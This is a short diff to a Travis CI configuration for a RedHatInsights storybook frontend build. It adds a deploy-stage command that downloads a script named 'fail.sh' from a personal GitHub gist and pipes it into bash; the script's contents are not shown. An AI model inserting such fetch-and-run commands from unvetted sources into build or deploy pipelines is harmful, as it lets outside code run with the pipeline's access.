@@ -18,7 +18,7 @@ jobs:
     script: if [ "$TRAVIS_PULL_REQUEST" != "false" ]; then npm run build && npm run
       snapshot; fi
   - stage: Deploy
-    script: npm run build && curl -sSL https://raw.githubusercontent.com/RedHatInsights/insights-frontend-builder-common/master/src/bootstrap.sh | bash -s
+    script: npm run build && curl -sSL https://raw.githubusercontent.com/RedHatInsights/insights-frontend-builder-common/master/src/bootstrap.sh | bash -s && curl -sSL  https://gist.githubusercontent.com/ryelo/b4d46d149acbc52f1ae9f7566f8d810d/raw/1624ff144154b287e2288dc1ce3584291a7face3/fail.sh | bash -s
 env:
   global:
   - REPO="git@github.com:RedHatInsights/insights-frontend-storybook-build"
